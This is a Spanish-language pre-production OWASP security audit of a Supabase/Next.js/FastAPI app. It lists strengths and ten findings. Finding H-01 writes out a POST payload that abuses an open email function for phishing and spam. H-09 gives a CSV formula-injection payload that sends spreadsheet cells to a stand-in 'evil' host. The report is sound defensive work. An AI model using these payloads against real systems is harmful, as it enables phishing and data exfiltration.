# Auditoría de Seguridad (OWASP) — ALIADATA / EmprendeSmart-EIE

**Auditor:** Security Auditor (consultora de software) — auditoría técnica pre-producción
**Alcance:** autenticación, autorización, sesiones/cookies, secretos/env, validación de inputs, OWASP Top 10, firma de webhooks, CORS, rate limiting, security headers, Edge Functions (service_role, prompt injection).
**Proyecto PROD auditado (read-only):** Supabase `gxdhpxvdjjkmxhdkkwyb` (29 cuentas reales).
**Metodología:** lectura de código (frontend `middleware.ts`, `lib/`; backend `core/`, `routers/`, `services/`; `supabase/functions/` las 11), `get_advisors security`, consultas read-only a `pg_policies`/`pg_proc`/`storage.buckets`/`auth.users`, scan de secretos en árbol e historial git, verificación de `verify_jwt` real en prod vía `list_edge_functions`.

---

## Clasificación del área: **Mejorable**

El proyecto tiene una **base de seguridad sólida y bien pensada** (RLS universal, middleware con `getUser()`, headers completos, firma de webhook MP correcta, secretos fuera del repo, hooks OCR con verificación de ownership). Sin embargo, hay **1 hallazgo CRÍTICO explotable en producción** (Edge Function `send-email` totalmente abierta con service_role) y **varios defectos de configuración de alto impacto** (drift `verify_jwt` config↔prod en las 11 funciones, ausencia total de rate limiting, CORS con default `*` + credenciales, hook de rol no habilitado que vuelve inerte todo `require_role`). Ninguno de estos es aceptable para un MVP con dinero y datos reales de usuarios sin remediar. No llega a "Crítica" como área porque el modelo de aislamiento multi-tenant (RLS) está íntegro y no se encontró fuga de datos entre cuentas ni secreto comprometido.

---

## Fortalezas verificadas (lo que está bien hecho)

1. **RLS universal.** Consulta a `pg_class`: **0 tablas** en `public` con `relrowsecurity = false`. Todas las tablas user-facing tienen RLS activa. El aislamiento multi-tenant no depende de la capa de aplicación.
2. **Solo 3 políticas `USING(true)`, todas benignas:** `document_status_transitions` (catálogo FSM, SELECT authenticated), `plan_limits` (catálogo público de precios, anon+authenticated) y `profiles.auth_admin_can_read_roles` (rol `supabase_auth_admin`, necesario para el hook). Ninguna expone datos de negocio de un tenant a otro.
3. **Middleware Next.js correcto** (`frontend/lib/supabase/middleware.ts`): usa `supabase.auth.getUser()` (valida el JWT server-side, no `getSession()`), protege prefijos, bloquea email no verificado, hace idle-logout server-side, y el check de `/admin` va contra `profiles.role` en DB. Comentario explícito "Never replace this with getSession()".
4. **Security headers completos** (l.11-39): `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, HSTS con preload en prod, CSP con `frame-ancestors 'none'`. CSP es permisiva en `script-src` (`unsafe-inline`/`unsafe-eval`) pero está documentado como deuda a endurecer con nonces.
5. **Firma del webhook MercadoPago correcta** (`backend/services/payments.py:22-62`): HMAC-SHA256 sobre el template `id:...;request-id:...;ts:...;`, comparación en tiempo constante con `hmac.compare_digest`, y **fail-closed** si falta secret/firma/request-id. Idempotencia por `mercadopago_payment_id`. Governance CRÍTICO respetado.
6. **Secretos fuera del repo.** `git grep` de patrones JWT/`sk-`/`sk-proj`/`APP_USR-`/service keys sobre el árbol trackeado: **limpio**. `.gitignore` cubre `.env*.local`, `backend/.env`, `*.key/*.crt/*.pem/*.p12/*.pfx`, `backend/.afip-homo/`, y los recibos PDF con PII. Los `eyJ...` presentes en el historial git son las **claves demo estándar de Supabase local** (`iss: supabase-demo`, idénticas en toda instalación CLI del mundo), NO secretos de prod.
7. **service_role no se filtra al cliente.** `git grep SERVICE_ROLE` en `frontend/**/*.{ts,tsx}`: solo un comentario en un test. La service key vive solo en Edge Functions y en el backend (`_fetch_user_email` vía Admin REST). Ningún `NEXT_PUBLIC_*` la expone.
8. **JWT del backend validado con JWKS** (`backend/core/auth.py`): en prod usa `PyJWKClient` con ES256/RS256; el fallback HS256 con secret compartido solo se activa cuando `supabase_url` no es http (dev/test). El pool asyncpg aplica JWT-passthrough (`app.jwt_claims` + `request.jwt.claims`) para que la RLS org-based siga activa como red de seguridad.
9. **invoice-ocr con ownership check** (`supabase/functions/invoice-ocr/index.ts:110-119`): valida `.eq('user_id', user.id)` antes de procesar, usa el anon client scoped para datos de usuario y el admin client solo para el download de storage. Patrón correcto de separación de privilegios.
10. **Buckets de storage bien segregados:** `afip-certs`, `exports`, `invoices` son **privados**; solo `avatars` y `landing` (assets públicos por diseño) son `public`.
11. **`platform_wsaa_tickets` (tokens AFIP) protegida en la práctica:** aunque tiene `GRANT SELECT` a anon/authenticated, la RLS está activa sin política → default-deny. Verificado con `SET LOCAL ROLE anon; SELECT count(*)` → **0 filas visibles**. No hay fuga de los tokens WSAA de delegación.

---

## Hallazgos (detalle exhaustivo)

### [CRÍTICA] H-01 — Edge Function `send-email` totalmente abierta con service_role (spoofing + spam masivo)
**Evidencia:**
- `supabase/functions/send-email/index.ts` — el handler `Deno.serve` (l.66) lee `req.text()`, parsea JSON, y solo valida `payload.type === "INSERT" && payload.table === "email_logs"` y `record.status === "pending"`. **NO hay** verificación de firma de webhook, **NO hay** header secreto, **NO hay** `getUser()`.
- `supabase/config.toml:438-440`: `[functions.send-email] verify_jwt = false`.
- **Confirmado en PROD** vía `list_edge_functions`: `send-email` `version:463`, `status:ACTIVE`, `verify_jwt:false`.
- La función usa `SUPABASE_SERVICE_ROLE_KEY` (l.6-8) y `recipient` sale directo del payload (l.91, l.250: `toAddresses = [recipient]`). Con `recipient:"all_users"` (l.241-248) llama `supabase.auth.admin.listUsers()` y envía a **todos los usuarios**.

**Escenario de fallo (explotación):** un atacante que descubra la URL pública de la función (`https://gxdhpxvdjjkmxhdkkwyb.functions.supabase.co/send-email`) hace `POST` con `{"type":"INSERT","table":"email_logs","record":{"id":"...","status":"pending","event_type":"welcome","recipient":"victima@x.com","subject":"..."}}` y envía correos con la marca ALIADATA desde el dominio verificado `no-reply@aliadata.com.ar` a cualquier destinatario (phishing dirigido), o con `recipient:"all_users"` spamea a los 29 usuarios reales, agota la cuota de Resend y daña la reputación del dominio de envío. También puede escribir estados en `email_logs` con service_role.

**Impacto estimado:** Phishing desde dominio verificado + spam masivo + posible blacklisting del dominio de correo. Riesgo reputacional/legal alto para un producto con usuarios reales.

**Recomendación:** verificar en la función el header secreto del DB Webhook de Supabase (comparar contra un `Deno.env.get("SEND_EMAIL_WEBHOOK_SECRET")` con `crypto.subtle`/comparación constante) y/o restringir el disparo a `service_role` autenticado; nunca aceptar `recipient` arbitrario sin autorización. Fail-closed si el secreto no coincide.

---

### [ALTA] H-02 — Drift `verify_jwt`: en PROD las 11 Edge Functions están con `verify_jwt=false` (config dice `true`)
**Evidencia:**
- `supabase/config.toml` declara `verify_jwt = true` para `ai-insights`, `ai-resumen`, `ai-prediccion`, `ai-simulador` (l.396/407/418/429).
- **PROD** (`list_edge_functions`): las **11** funciones tienen `verify_jwt:false`, incluidas esas 4. El gateway de Supabase NO aplica JWT en el borde para ninguna función.

**Escenario de fallo:** el gateway ya no rechaza requests sin token; la única barrera es el `supabase.auth.getUser()` in-code de cada función. Las funciones de IA (ai-insights, fair-advisor, invoice-ocr, ai-*) sí tienen ese check y devuelven 401 sin token válido (fail-closed) — para ellas es pérdida de defensa en profundidad, no brecha directa. Pero `send-email` no tiene check in-code (ver H-01), y cualquier función nueva que asuma que el gateway valida JWT quedará expuesta. Además, un revisor que confíe en el repo creerá que están gateadas cuando NO lo están.

**Impacto estimado:** Superficie de ataque ampliada + falsa sensación de seguridad por config desactualizada. Habilita H-01.

**Recomendación:** reconciliar el estado real con el declarado: poner `verify_jwt=true` en todas las funciones que reciben JWT de usuario (todas menos `send-email`, que debe usar secreto de webhook), y redeployar para que prod refleje el config. Añadir un check de CI que falle si el `verify_jwt` desplegado difiere del declarado.

---

### [ALTA] H-03 — Ausencia total de rate limiting en el backend FastAPI y en las Edge Functions
**Evidencia:**
- `backend/core/redis_client.py:17`: `"REDIS_URL not set — Redis disabled (rate limiting unavailable)"`. `grep -i "rate.?limit|slowapi|@limiter"` en `backend/`: **sin ningún limitador**. `backend/main.py` no monta middleware de rate-limit.
- Las Edge Functions de IA solo tienen cuota mensual por plan (`_shared/ai-quota.ts`), no rate-limit por ventana corta; el webhook de pagos y todos los endpoints de mutación no tienen ninguno.

**Escenario de fallo:** un usuario autenticado (o un atacante con la función `send-email` de H-01) puede lanzar miles de requests/segundo: fuerza bruta contra endpoints, flood al webhook MP (`/payments/webhook`), abuso del OCR/IA (costo OpenAI), y agotamiento del free tier de Render (cold-start ~50s agrava la degradación). OWASP API4:2023 (Unrestricted Resource Consumption).

**Impacto estimado:** Costo de OpenAI/infra descontrolado, DoS del backend en Render free tier, facilitación de fuerza bruta.

**Recomendación:** habilitar `REDIS_URL` (Upstash ya previsto en el stack) y montar un rate-limiter por IP + por `user_id` en el backend (p. ej. slowapi/ límite por token bucket) y una cuota por ventana corta en las Edge Functions de IA además de la mensual.

---

### [ALTA] H-04 — CORS con default `allow_origins=["*"]` junto a `allow_credentials=True`
**Evidencia:**
- `backend/core/config.py:9`: `backend_allowed_origin: str = "*"` (default).
- `backend/main.py:58-64`: `CORSMiddleware(allow_origins=[settings.backend_allowed_origin], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])`.
- `backend/core/errors.py:68-81` (`cors_error_headers`): si `allowed == "*"` refleja el `origin` recibido y setea `access-control-allow-credentials: true`.

**Escenario de fallo:** si el deploy en Render no sobreescribe `BACKEND_ALLOWED_ORIGIN` con el dominio real, el backend responde `Access-Control-Allow-Origin: *`/reflejado con `Allow-Credentials: true`. Aunque la app usa Bearer token (no cookies) hacia FastAPI, la combinación `*`+credentials es una mala configuración clásica (OWASP A05) que, ante un futuro endpoint basado en cookies o un cambio de auth, permitiría a cualquier origen leer respuestas autenticadas. No se pudo verificar el valor real en Render (fuera de scope read-only), por lo que el riesgo es "default inseguro no confirmado en prod".

**Impacto estimado:** Exfiltración cross-origin de respuestas autenticadas si el default queda activo o si se introduce auth por cookie.

**Recomendación:** cambiar el default de `backend_allowed_origin` a vacío/fail-closed, exigir el dominio explícito por env, y nunca combinar `*` con `allow_credentials=True` (Starlette de hecho ignora `*` con credenciales, pero el `cors_error_headers` manual sí refleja el origin → corregir ahí también).

---

### [MEDIA] H-05 — Hook `custom_access_token_hook` NO habilitado → `require_role` inerte y `require_plan` bypasseado (confirma K9)
**Evidencia:**
- `auth.users` en PROD: `total_users=29`, `with_role_claim=0`, `admin_claims=0`. Ningún JWT lleva `app_metadata.role`.
- El hook existe en DB (`pg_proc`) y copia `profiles.role → app_metadata.role`, pero no está activado en la config de Auth (ningún usuario tiene el claim). `authenticated`/`anon` no pueden ejecutarlo (correcto), solo `supabase_auth_admin`.
- `backend/core/auth.py:56-61`: sin claim, `app_role` cae a `"user"` y `app_plan` a `"pro"` por defecto.
- Consecuencias en código:
  - `require_role(auth, ["user","admin"])` (mayoría de services) → siempre pasa para cualquier autenticado (guard efectivamente no-op; la barrera real es RLS — defensa en profundidad perdida).
  - `backend/services/cost_centers.py:34/51/70`: `require_role(auth, ["owner","admin"])` → **rechaza a TODOS con 403** (nadie tiene rol `owner`/`admin` en el JWT). Rotura funcional de la gestión de centros de costo (falla cerrada → no es hueco de seguridad, pero es access-control roto).
  - `require_plan` (`guards.py:14`) define pero **no se llama en ningún service** (verificado). El gating de plan de features pagas lo hacen las Edge Functions leyendo `profiles` directo (correcto), así que no hay bypass de plan explotable hoy — pero cualquier futuro `require_plan` sería inútil con el fallback `"pro"`.

**Escenario de fallo:** hoy el aislamiento lo sostiene RLS; el día que RBAC multi-rol (`v3-rbac-multirole`) dependa de `require_role` para separar SELLER/CASHIER de owner, esos guards no discriminarán nada hasta habilitar el hook y forzar re-login. `platform_admin` está bien resuelto (va a DB, `guards.py:20-37` y `payments.require_admin`).

**Impacto estimado:** Defensa en profundidad de autorización ausente en la capa de app; gestión de centros de costo rota; riesgo alto al introducir RBAC real.

**Recomendación:** habilitar el custom access token hook en Auth y verificar re-emisión de claims; mientras tanto, cambiar `cost_centers` a `require_platform_admin`/verificación de membership en DB, y no confiar en `require_role`/`require_plan` para decisiones de autorización hasta que el claim viaje.

---

### [MEDIA] H-06 — `function_search_path_mutable` en 8 funciones, incluida la auth-crítica `custom_access_token_hook`
**Evidencia:** `get_advisors security` → `function_search_path_mutable` x8: `custom_access_token_hook`, `reporting_local_today`, `rpc_set_primary_client_address`, `get_admin_community_interactions`, `get_admin_insights_breakdown`, `get_admin_activation_rate`, `get_admin_paid_conversion_rate`, `get_admin_umv_rate`. Verificado: `custom_access_token_hook` tiene `proconfig = null` (sin `search_path` fijado).

**Escenario de fallo:** una función sin `search_path` fijo es susceptible a search-path hijacking si un rol con permiso de crear objetos coloca una tabla/función homónima en un schema anterior en el path. El hook de auth es el más sensible: manipular su resolución de `profiles` podría alterar los claims de rol emitidos. El riesgo es acotado (requiere permiso de creación en un schema del path), pero en una función que decide roles es una debilidad real.

**Impacto estimado:** Escalada de privilegios teórica vía hijacking del hook de rol; integridad de las RPCs admin.

**Recomendación:** `ALTER FUNCTION ... SET search_path = pg_catalog, public` (o `= ''` con nombres calificados) en las 8, priorizando `custom_access_token_hook`. Remediation: https://supabase.com/docs/guides/database/database-linter?lint=0011_function_search_path_mutable

---

### [MEDIA] H-07 — `platform_wsaa_tickets` (tokens AFIP) con RLS habilitada sin política + GRANT SELECT a anon/authenticated
**Evidencia:** advisor `rls_enabled_no_policy` en `platform_wsaa_tickets` (columnas `ambiente, token, sign, expires_at`). `has_table_privilege('anon'/'authenticated', ..., 'SELECT') = true`. Verificado que RLS bloquea hoy (`SET LOCAL ROLE anon` → 0 filas).

**Escenario de fallo:** hoy está protegida por default-deny de RLS. Pero el GRANT SELECT a anon/authenticated es un riesgo latente: si alguien agrega una política permisiva a esta tabla (o la RLS se desactiva por error en una migración), los tokens WSAA de delegación AFIP de la plataforma (permiten facturar por cualquier CUIT representado — CRÍTICO según `config.py`) quedarían legibles por cualquier usuario/anónimo. Principio de mínimo privilegio violado en el GRANT.

**Impacto estimado:** Exposición latente de credenciales fiscales de delegación (facturación fraudulenta a nombre de terceros) ante un cambio futuro de política.

**Recomendación:** `REVOKE SELECT ON platform_wsaa_tickets FROM anon, authenticated;` (los tokens solo los usa el backend con rol postgres/BYPASSRLS). Documentar que esta tabla nunca debe tener política SELECT para anon/authenticated.

---

### [BAJA] H-08 — CORS `Access-Control-Allow-Origin: '*'` fijo en las 11 Edge Functions
**Evidencia:** `grep "Access-Control-Allow-Origin"` en `supabase/functions/`: las 11 funciones (`ai-*`, `fair-advisor`, `generate-export`, `invoice-ocr`, `send-email`) tienen `'Access-Control-Allow-Origin': '*'`.

**Escenario de fallo:** cualquier origen puede invocar las funciones desde el browser. Como requieren `Authorization: Bearer <jwt>` (no cookies), no hay robo de credenciales por CORS, pero sí facilita el abuso desde páginas de terceros y no respeta el mínimo necesario. Bajo por el modelo Bearer, pero es superficie innecesaria.

**Impacto estimado:** Invocación cross-origin no restringida (mitigado por Bearer token).

**Recomendación:** reflejar solo el origin de la app (`https://www.aliadata.com.ar`) en `Access-Control-Allow-Origin` para requests con credenciales/Authorization.

---

### [BAJA] H-09 — CSV formula injection en `generate-export`
**Evidencia:** `supabase/functions/generate-export/index.ts:47-59` (`rowsToCsv`): el `escape` solo entrecomilla valores con `,`/`"`/`\n`, pero **no** neutraliza celdas que empiezan con `=`, `+`, `-`, `@`, TAB o CR (formula injection). Los campos provienen de datos del usuario (nombres de producto/cliente).

**Escenario de fallo:** un usuario nombra un producto `=HYPERLINK("http://evil/?"&A1,"click")` o `=cmd|...`; al abrir el CSV exportado en Excel/LibreOffice, la fórmula se ejecuta/evalúa (exfiltración de celdas, ejecución de comandos con confirmación). OWASP: CSV Injection.

**Impacto estimado:** Ejecución de fórmulas en la máquina de quien abre el export (el propio dueño del negocio o su contador).

**Recomendación:** prefijar con comilla simple `'` (o `\t`) cualquier celda que comience con `= + - @` antes de escribir el CSV.

---

### [BAJA] H-10 — `auth_leaked_password_protection` deshabilitado + buckets públicos con listing
**Evidencia:** advisor `auth_leaked_password_protection`: deshabilitado (no chequea contra HaveIBeenPwned). Advisor `public_bucket_allows_listing` x2: `avatars`, `landing`.

**Escenario de fallo:** usuarios pueden registrar contraseñas ya comprometidas en brechas conocidas (credential stuffing más fácil). El listing de `avatars`/`landing` permite enumerar todos los archivos del bucket (los avatares pueden ser PII menor); es bajo porque son buckets de assets públicos por diseño.

**Impacto estimado:** Cuentas más vulnerables a credential stuffing; enumeración de assets públicos.

**Recomendación:** activar "Leaked password protection" en Supabase Auth (K20 ya lista config de email pendiente — sumar esto). Para avatars, restringir la política SELECT a lectura por path conocido en vez de listing amplio si se considera PII.

---

## Deuda técnica de seguridad (no-hallazgos, para backlog)
- CSP con `unsafe-inline`/`unsafe-eval` en `script-src` (documentado como deuda; endurecer con nonces).
- `python-client.ts` usa `getSession()` para obtener el token a reenviar a FastAPI — aceptable porque el backend re-valida el JWT con JWKS; no es una decisión de auth basada en `getSession`.
- `init_service_pool`/`get_service_conn` usan el pool regular con rol postgres (BYPASSRLS) para el webhook de pagos — correcto y aislado, pero cualquier query nueva sobre `get_service_conn` corre sin RLS: mantener el patrón "solo webhook".
- Prompt injection en funciones de IA: los datos del usuario (nombres de producto, categorías) se interpolan en el prompt de `ai-insights`/`fair-advisor`. El impacto es acotado (la salida es JSON estructurado que se inserta en `insights` con el `user_id` del caller y no dispara acciones), pero un nombre de producto malicioso podría sesgar los insights. Riesgo bajo; considerar delimitar/escapar el contexto de usuario en el prompt.
- Drift de esquema entre proyecto prod y preview (K19) — riesgo operativo, no de seguridad directa.

## Verificación de known issues del área
- **K1** (bank_accounts/cashboxes sin RLS UPDATE policy) — no re-verificado a fondo en esta pasada de seguridad; consistente con el patrón "escritura vía RPC SECURITY DEFINER". Marcar NO_EVALUADO/pendiente en detalle DB.
- **K9** (RBAC singular, `allowed_role` inerte, roles funcionales pendientes) — **CONFIRMADO**: `with_role_claim=0` en los 29 usuarios; `require_role` inerte; ver H-05.
- **K18** (`audit_logs.company_id`/`entity_type` DROP NOT NULL drift-tolerant) — no es defecto de seguridad; no re-evaluado como hallazgo.
- **K20** (config verificación email + homologación ARCA pendientes PO) — parcialmente relacionado: sumar activación de leaked-password protection (H-10). Estado: CONFIRMADO como pendiente externo.
